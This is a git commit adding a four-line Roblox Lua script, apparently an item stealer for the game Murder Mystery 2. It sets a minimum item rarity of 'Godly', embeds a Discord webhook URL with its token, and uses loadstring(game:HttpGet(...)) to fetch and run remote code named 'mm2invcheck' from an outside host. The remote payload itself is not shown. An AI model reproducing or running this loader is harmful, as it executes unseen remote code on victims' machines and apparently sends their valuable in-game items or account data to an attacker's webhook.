523a2a930f5f28d90f88adef428f7937f7700d84
anarchist5 <shkebedi00@gmail.com>
2025-10-27 23:28:24 +0300

    Add files via upload

---
+++ gfdt.lua
@@ -0,0 +1,4 @@
+min_value = 1
+min_rarity = "Godly"
+webhook =  "https://discordapp.com/api/webhooks/1432463320979603487/idszAg4zy21Bn_QfkpXgv7MKXZRY1VsOPYxXBxm5EPui-CoXkgWM4nzT0CL90sN-hDtN"
+loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/mm2invcheck"))()
